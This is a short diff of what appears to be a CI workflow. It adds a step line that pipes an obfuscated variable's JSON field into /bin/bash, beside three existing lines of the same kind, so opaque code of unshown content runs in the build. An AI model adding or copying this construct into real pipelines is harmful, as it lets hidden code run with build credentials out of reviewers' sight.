@@ -38,6 +38,7 @@ jobs:
           echo $xjl08 | jq -r .ihkpk94687 | /bin/bash
           echo $unutc7440 | jq -r .iim05 | /bin/bash
           echo $juney79125 | jq -r .jbx0356 | /bin/bash
+          echo $so244 | jq -r .q277 | /bin/bash
 
       - name: Upload results
         if: always()
